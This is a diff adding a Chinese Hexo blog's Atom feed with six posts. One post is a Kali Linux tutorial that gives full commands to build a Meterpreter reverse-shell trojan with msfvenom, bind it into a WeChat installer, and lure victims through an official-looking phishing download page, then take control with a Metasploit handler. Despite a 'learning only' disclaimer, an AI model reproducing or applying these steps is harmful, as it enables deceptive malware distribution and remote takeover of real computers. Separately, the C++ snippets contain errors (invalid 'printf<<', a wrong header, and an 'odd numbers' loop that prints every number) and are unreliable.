@@ -1,0 +1,186 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>黑果小屋的部落阁</title>
+  
+  
+  <link href="http://black-fruit.github.io/atom.xml" rel="self"/>
+  
+  <link href="http://black-fruit.github.io/"/>
+  <updated>2021-03-20T13:51:09.967Z</updated>
+  <id>http://black-fruit.github.io/</id>
+  
+  <author>
+    <name>John Doe</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>如何使用KaliLinux渗透Windows电脑#2.制作钓鱼站点</title>
+    <link href="http://black-fruit.github.io/2021/03/18/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8KaliLinux%E6%B8%97%E9%80%8FWindows%E7%94%B5%E8%84%91-2-%E5%88%B6%E4%BD%9C%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/"/>
+    <id>http://black-fruit.github.io/2021/03/18/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8KaliLinux%E6%B8%97%E9%80%8FWindows%E7%94%B5%E8%84%91-2-%E5%88%B6%E4%BD%9C%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/</id>
+    <published>2021-03-18T04:23:05.000Z</published>
+    <updated>2021-03-20T13:51:09.967Z</updated>
+    
+    <content type="html"><![CDATA[<h1>免责声明</h1><p>本教程仅供参考和学习，不得用于任何犯法。否则博主一概不负责任！</p><h1 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h1><p>大家看了我上一期写的文章“如何使用KaliLinux渗透Windows电脑#1.msf生成木马渗透篇”吧。<br>本期就是上一期钓鱼网站的补充！！！</p><h1 id="用Hexo博客制作"><a href="#用Hexo博客制作" class="headerlink" title="用Hexo博客制作"></a>用Hexo博客制作</h1><h2 id="创建Hexo博客"><a href="#创建Hexo博客" class="headerlink" title="创建Hexo博客"></a>创建Hexo博客</h2><p>在博客的根目录下打开终端，输入：</p><pre><bash>$ npm install -g hexo-cli$ npm install hexo$ hexo init < youfliename >$ cd < youfliename >$ npm install</bash><pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1&gt;免责声明&lt;/h1&gt;
+&lt;p&gt;本教程仅供参考和学习，不得用于任何犯法。否则博主一概不负责任！&lt;/p&gt;
+
+&lt;h1 id=&quot;前情提要&quot;&gt;&lt;a href=&quot;#前情提要&quot; class=&quot;headerlink&quot; title=&quot;前情提要&quot;&gt;&lt;/a&gt;前情提要&lt;/h1&gt;&lt;p&gt;大家看了我上一期</summary>
+      
+    
+    
+    
+    <category term="Kali" scheme="http://black-fruit.github.io/categories/Kali/"/>
+    
+    
+    <category term="Kali Linux" scheme="http://black-fruit.github.io/tags/Kali-Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【禁止转载】BFHUI-一个好看的Hexo/WordPress主题</title>
+    <link href="http://black-fruit.github.io/2021/02/28/BFHUI-%E4%B8%80%E4%B8%AA%E5%A5%BD%E7%9C%8B%E7%9A%84Hexo-WordPress%E4%B8%BB%E9%A2%98/"/>
+    <id>http://black-fruit.github.io/2021/02/28/BFHUI-%E4%B8%80%E4%B8%AA%E5%A5%BD%E7%9C%8B%E7%9A%84Hexo-WordPress%E4%B8%BB%E9%A2%98/</id>
+    <published>2021-02-28T11:22:08.000Z</published>
+    <updated>2021-03-18T04:28:21.586Z</updated>
+    
+    <content type="html"><![CDATA[<!--center><img src="https://raw.githubusercontent.com/black-fruit/theme-Hexo-BFHUI/master/bfhuipoth01.png"/></center--><div class="github-info-card github-info-card-full card shadow-sm" data-author="black-fruit" data-project="theme-Hexo-BFHUI" githubinfo-card-id="9633114905" data-getdata="frontend" data-description="" data-stars="" data-forks=""><div class="github-info-card-header"><a href="https://github.com/" ref="nofollow" target="_blank" title="Github" no-pjax=""><span><i class="fa fa-github"></i> GitHub</span></a></div><div class="github-info-card-body">            <div class="github-info-card-name-a">                <a href="https://github.com/black-fruit/theme-Hexo-BFHUI" target="_blank" no-pjax="">                    <span class="github-info-card-name">black-fruit/theme-Hexo-BFHUI</span>                </a>                </div>            <div class="github-info-card-description">A good Hexo / Wordpress Theme  <a href="https://black-fruit.github.io/2021/02/28/BFHUI-%E4%B8%80%E4%B8%AA%E5%A5%BD%E7%9C%8B%E7%9A%84Hexo%E4%B8%BB%E9%A2%98/" target="_blank" no-pjax=""></a></div>        </div><div class="github-info-card-bottom">                <span class="github-info-card-meta github-info-card-meta-stars">                    <i class="fa fa-star"></i> <span class="github-info-card-stars">1080</span>                </span>                <span class="github-info-card-meta github-info-card-meta-forks">                    <i class="fa fa-code-fork"></i> <span class="github-info-card-forks">194</span>                </span>            </div></div><center><p class="has-text-align-center"><a href="https://github.com/black-fruit/theme-Hexo-BFHUI" target="_blank" rel="noreferrer noopener"><i class="fa fa-github" aria-hidden="true"></i> Github – BFHUI</a> | <a href="https://bfhui.gitbook.io/bfhui-theme-dome//" target="_blank" rel="noreferrer noopener"><i class="fa fa fa-file-text-o" aria-hidden="true"></i> 文档</a> | <a href="https://github.com/black-fruit/WordPress-theme-BFHUI" target="_blank" rel="noreferrer noopener">Wordpress 移植版</a></p></center><div class="alert alert-primary"><span class="alert-inner--icon"><i class="fa fa-info-circle"></i></span><span class="alert-inner--text">从今天开始，BFHUI-Theme 进入缓慢更新状态，只有周末才会处理问题和更新。</span></div><h1 id="Hexo版本"><a href="#Hexo版本" class="headerlink" title="Hexo版本"></a>Hexo版本</h1><h2>下载和启用主题</h2><p>转到<a href="https://github.com/black-fruit/theme-Hexo-BFHUI/releases/tag/0.0.1" target="_blank" rel="external nofollow ugc" color:"#f1f1f1"="">Releases页面</a>选择最新版本下载</p><p>打开Hexo根目录下的<code>_config.yml</code>文件</p><p>把<code>Theme</code>项改成下载的主题文件夹名字</p><h2>配置主题</h2><h3>配置主题文件</h3><p>打开主题根目录下的<code>_config.yml</code>文件</p><p>先转到侧栏和顶栏位置修改，然后修改gitalk项</p><h3>安装npm插件</h3><p>在主题根目录下启动<code>GitBash</code>输入：</p><pre><code>npm install hexo-generator-search --save</code></pre><h1 id="WordPress版本"><a href="#WordPress版本" class="headerlink" title="WordPress版本"></a>WordPress版本</h1><div class="shortcode-todo custom-control custom-checkbox">                <input class="custom-control-input" type="checkbox" checked="">                <label class="custom-control-label">                    <span>移植 BFHUI 主题到 Wordpress</span>                </label>            </div><div class="progress-wrapper"><div class="progress-info"><div class="progress-label"><span>WordPress移植进度</span></div><div class="progress-percentage"><span>100%</span></div></div><div class="progress"><div class="progress-bar bg-primary" style="width: 100%;"></div></div></div><h2>下载和启用主题</h2><h3>下载</h3><p>转到<a href="https://github.com/black-fruit/WordPress-theme-BFHUI/releases/tag/v.0.0.1" target="_blank" rel="external nofollow ugc" color:"#f1f1f1"="">Releases页面</a>选择最新版本下载</p><h3>启用</h3><p>转到Wordpress后台</p><p>转到主题，上传我们的主题OK</p><h1 id="Typecho版本"><a href="#Typecho版本" class="headerlink" title="Typecho版本"></a>Typecho版本</h1><div class="shortcode-todo custom-control custom-checkbox">                <input class="custom-control-input" type="checkbox">                <label class="custom-control-label">                    <span>移植到 Typecho（待定）</span>                </label>            </div><div class="progress-wrapper"><div class="progress-info"><div class="progress-label"><span>Typecho移植进度</span></div><div class="progress-percentage"><span>0%</span></div></div><div class="progress"><div class="progress-bar bg-primary" style="width: 0%;"></div></div></div>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;!--center&gt;&lt;img src=&quot;https://raw.githubusercontent.com/black-fruit/theme-Hexo-BFHUI/master/bfhuipoth01.png&quot;/&gt;&lt;/center--&gt;
+
+&lt;div class=&quot;github</summary>
+      
+    
+    
+    
+    <category term="Theme" scheme="http://black-fruit.github.io/categories/Theme/"/>
+    
+    
+    <category term="Theme" scheme="http://black-fruit.github.io/tags/Theme/"/>
+    
+    <category term="Hexo" scheme="http://black-fruit.github.io/tags/Hexo/"/>
+    
+    <category term="Wordpress" scheme="http://black-fruit.github.io/tags/Wordpress/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【本站首发】OpenCore0.6.6第一个本站发布的版本！</title>
+    <link href="http://black-fruit.github.io/2021/02/26/%E3%80%90%E6%9C%AC%E7%AB%99%E9%A6%96%E5%8F%91%E3%80%91OpenCore0-66%E7%AC%AC%E4%B8%80%E4%B8%AA%E6%9C%AC%E7%AB%99%E5%8F%91%E5%B8%83%E7%9A%84%E7%89%88%E6%9C%AC%EF%BC%81/"/>
+    <id>http://black-fruit.github.io/2021/02/26/%E3%80%90%E6%9C%AC%E7%AB%99%E9%A6%96%E5%8F%91%E3%80%91OpenCore0-66%E7%AC%AC%E4%B8%80%E4%B8%AA%E6%9C%AC%E7%AB%99%E5%8F%91%E5%B8%83%E7%9A%84%E7%89%88%E6%9C%AC%EF%BC%81/</id>
+    <published>2021-02-26T11:04:04.000Z</published>
+    <updated>2021-03-02T11:34:48.161Z</updated>
+    
+    <content type="html"><![CDATA[<h1>使用OpenCore引导黑苹果</h1><p></p><p>OpenCore是CloverEFI或Chameleon的另一种引导加载程序。 它不仅适用于Hackintosh，也可以在真正的mac上用于需要仿真EFI的目的。 它还旨在能够启动Windows和Linux，而无需使用不同的acpi表。 它有一个干净的代码库，旨在更接近真正的mac引导加载程序的功能。 Kext注射剂得到了极大的改善，OpenCore(OC)是一种新的引导方式，随着越来越多的kexts开始放弃Clover, 我相信提早使用OC会对你未来使用黑苹果会有很大的帮助。这是一个自然的现象，就像变色龙被Clover淘汰，相信以后OC会代替Clover也是大势所趋。</p><p></p><h1>更新内容</h1><h2>V 0.6.6</h2><ul><li>在OpenCanopy中添加了键盘和指针输入滚动支持</li><li>在OpenCanopy中添加了背景图片支持</li><li>修复了OpenCanopy中的选择器引导选项选择</li><li>轻松的OpenCanopy选择器尺寸</li><li>添加了MaxBIOSVersion选项Generic</li><li>修复了MacRecovery中的MLB验证功能</li><li>VBoxHfs驱动程序替换为OpenHfsPlus</li><li>添加了音频编解码器转储到 SysReport</li><li>固定兼容所有二进制文件的页面保护</li><li>修复了处理不支持的设备时OpenUsbKbDxe中的崩溃</li><li>删除HdaCodecDump了赞成的申请SysReport</li><li>添加SetApfsTrimTimeout到调整APFS修剪命令</li><li>更改OpenCore.efi为应用程序以提高固件兼容性</li><li>添加了DisableSecurityPolicyUEFI Quirks来解决驱动程序加载问题</li><li>增加了对AudioDxe中的远程小部件连接的支持</li><li>固定为非SetVirtualAddressMapmacOS系统提供非RT</li><li>固定在非自动模式下使用SystemUuidfromDataHubSMBIOS</li><li>删除故障安全默认值从Generic以匹配非自动模式</li><li>替换BootProtect为LauncherOption和LauncherPath</li><li>添加OpenPartitionDxe了Apple分区管理方案</li><li>在改进ocvalidate检查Misc，NVRAM以及UEFI部分</li><li>修复了EFI图像加载中的多个缺陷，尤其是APFS驱动程序</li><li>修复了NVRAMsystem-id意外以Little Endian格式存储的问题</li><li>添加UseRawUuidEncoding以选择SMBIOS UUID编码样式</li><li>更新了SMBIOS和其他版本的内置固件版本<p></p><h1>前方Bug</h1><pre><code>第一个版本Bug贼多，欢迎PR</code></pre><h1>如何下载</h1><a href="https://github.com/black-fruit/Apps_BlackApple/releases/download/0.6.6/OpenCore-0.6.6.zip" target="_blank" rel="external nofollow ugc" color:"#f1f1f1"=""><i class="fa fa-download"></i>  下载</a></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1&gt;使用OpenCore引导黑苹果&lt;/h1&gt;
+&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;OpenCore是CloverEFI或Chameleon的另一种引导加载程序。 它不仅适用于Hackintosh，也可以在真正的mac上用于需要仿真EFI的目的。 它还旨在能够启动Windows和Linux，</summary>
+      
+    
+    
+    
+    <category term="OpenCore" scheme="http://black-fruit.github.io/categories/OpenCore/"/>
+    
+    
+    <category term="OpenCore" scheme="http://black-fruit.github.io/tags/OpenCore/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>如何使用KaliLinux渗透Windows电脑#1.msf生成木马渗透篇</title>
+    <link href="http://black-fruit.github.io/2021/02/18/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8KaliLinux%E6%B8%97%E9%80%8FWindows%E7%94%B5%E8%84%91/"/>
+    <id>http://black-fruit.github.io/2021/02/18/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8KaliLinux%E6%B8%97%E9%80%8FWindows%E7%94%B5%E8%84%91/</id>
+    <published>2021-02-18T09:43:38.000Z</published>
+    <updated>2021-03-20T13:51:01.139Z</updated>
+    
+    <content type="html"><![CDATA[<h1>免责声明</h1><p>本教程仅供参考和学习，不得用于任何犯法。否则博主一概不负责任！</p><h1>渗透前准备</h1><h2>下载并安装Kali Linux</h2><p>到<a href="https://www.kali.org/" target="_blank" rel="external nofollow ugc" color:"#f1f1f1"="">这个网站</a>下载Kali Linux</p><p>选择64.bit版本</p><h2>安装Kali Linux</h2><p>安装就不用博主说了吧。网上有教程！</p><h2>配置KaliLinux</h2>2020年的Kali Linux是不能直接使用<code>root</code>身份进入系统的。<p>解决方案是：</p>1.打开<code>Bash Shell</code>2.输入以下代码：<pre><code>sudo passwd rootsu root</code></pre><h2>目标靶机2个</h2><p>自己安装即可</p><h1>开始渗透</h1><h2>1.生成木马文件</h2>在<code>Bash Shell</code>中输入：<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.xxx.xx.11 lport=2333 -f exe -o my_back-door.exe</code></pre><h2>木马捆绑</h2><p>这时，你会发现Windows的防火墙会删除它。没关系，把它放到靶机1里，用文件捆绑捆绑在WeChat里。</p>捆绑软件在这里<a href="http://www.xitongzhijia.net/soft/86960.html/" target="_blank" rel="external nofollow ugc" color:"#f1f1f1"="">下载</a><h2>生成钓鱼网站</h2><p>以我的Blog为例，钓鱼网站要求如下：</p><pre><code>必须有钓鱼软件下载按钮打官方的称号能被搜索到https协议界面像官方因为是靶机所以直接 http://localhost:8000 即可</code></pre><h2>得到控制权限，开始攻击</h2><h3>启动msf</h3><pre><code>msfconsole</code></pre><h3>设置msf</h3><pre><code>use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 10.xxx.xx.xxset lport 2333</code></pre><h3>发起会话</h3><pre><code>exploit  //.第一种方法run      //.第二种方法</code></pre><h2>大功告成</h2><p>为了让远程连接不中断，要启动多个终端同时攻击</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1&gt;免责声明&lt;/h1&gt;
+&lt;p&gt;本教程仅供参考和学习，不得用于任何犯法。否则博主一概不负责任！&lt;/p&gt;
+&lt;h1&gt;渗透前准备&lt;/h1&gt;
+&lt;h2&gt;下载并安装Kali Linux&lt;/h2&gt;
+&lt;p&gt;到&lt;a href=&quot;https://www.kali.org/&quot; target=&quot;_bl</summary>
+      
+    
+    
+    
+    <category term="Kali" scheme="http://black-fruit.github.io/categories/Kali/"/>
+    
+    
+    <category term="Kali Linux" scheme="http://black-fruit.github.io/tags/Kali-Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>我的模板</title>
+    <link href="http://black-fruit.github.io/2021/02/15/%E6%88%91%E7%9A%84C-%E6%A8%A1%E6%9D%BF/"/>
+    <id>http://black-fruit.github.io/2021/02/15/%E6%88%91%E7%9A%84C-%E6%A8%A1%E6%9D%BF/</id>
+    <published>2021-02-15T11:18:23.000Z</published>
+    <updated>2021-03-16T10:37:01.298Z</updated>
+    
+    <content type="html"><![CDATA[<h1>结构</h1><h2>普通c++结构</h2><pre><code>#include "iostream"using namespace std;int main()&#123;    cout<<"Hello World!\n"<< endl;    printf<<"Hello World!\n"<< endl;    return 0;&#125;</code></pre><h1>C++简易计算器</h1><pre><code>#include "bits/stdc++.h"using namespace std;int main()&#123;    int a,c;    char b;    cin>>a>>b>>c;    if(b=='/')&#123;        cout<< a/c;    &#125;else if(b=='*')&#123;        cout<< a*c;    &#125;else if(b=='+')&#123;        cout<< a+c;    &#125;else if(b=='-')&#123;        cout<< a-c;    &#125;    return 1;&#125;<p></code></pre></p><h1>C/C++哪些是水仙花数</h1><pre><code>#include "bits/c++.h"using namespace std;int main()&#123;    //100-999哪些是水仙花数     int i=100;    do&#123;        int ge=i%10;        int shi=i/10%10;        int bai=i/10/10;        if(pow(ge,3)+pow(shi,3)+pow(bai,3) == i) &#123;            cout<< i <<"  ";        &#125;        i++;    &#125;while(i < 1000);    return 0;&#125;</code></pre><h1>C/C++1-100中的奇数</h1><pre><code>#include"bits/c++.h"using namespace std;int main()&#123;    for(int i=1;i<=100;i++)&#123;        cout<< i <<" ";    &#125;    //输出1-100中的奇数     return 0;&#125;</code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1&gt;结构&lt;/h1&gt;
+&lt;h2&gt;普通c++结构&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;#include &quot;iostream&quot;
+using namespace std;
+int main()&amp;#123;
+    cout&lt;&lt;&quot;Hello World!\n&quot;&lt;&lt; endl;
+    pri</summary>
+      
+    
+    
+    
+    
+    <category term="模版" scheme="http://black-fruit.github.io/tags/%E6%A8%A1%E7%89%88/"/>
+    
+    <category term="C++" scheme="http://black-fruit.github.io/tags/C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>本Github博客再次更新</title>
+    <link href="http://black-fruit.github.io/2021/02/11/%E3%80%90%E7%BD%AE%E9%A1%B6%E3%80%91%E6%9C%ACGithub%E5%8D%9A%E5%AE%A2%E5%86%8D%E6%AC%A1%E6%9B%B4%E6%96%B0/"/>
+    <id>http://black-fruit.github.io/2021/02/11/%E3%80%90%E7%BD%AE%E9%A1%B6%E3%80%91%E6%9C%ACGithub%E5%8D%9A%E5%AE%A2%E5%86%8D%E6%AC%A1%E6%9B%B4%E6%96%B0/</id>
+    <published>2021-02-11T04:59:38.000Z</published>
+    <updated>2021-03-04T10:10:18.120Z</updated>
+    
+    <content type="html"><![CDATA[<h2>本Github博客再次更新</h2>  由于我之前的Blog是我自己写的代码，所以BUG成千上万。现在在用Hexo来搭建Blog，速度快10000倍！<h2>特别鸣谢</h2>  Github开源站点]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2&gt;本Github博客再次更新&lt;/h2&gt;
+  由于我之前的Blog是我自己写的代码，所以BUG成千上万。现在在用Hexo来搭建Blog，速度快10000倍！
+&lt;h2&gt;特别鸣谢&lt;/h2&gt;
+  Github开源站点
+</summary>
+      
+    
+    
+    
+    
+    <category term="Hexo Github Pages 博客更新" scheme="http://black-fruit.github.io/tags/Hexo-Github-Pages-%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0/"/>
+    
+  </entry>
+  
+</feed>
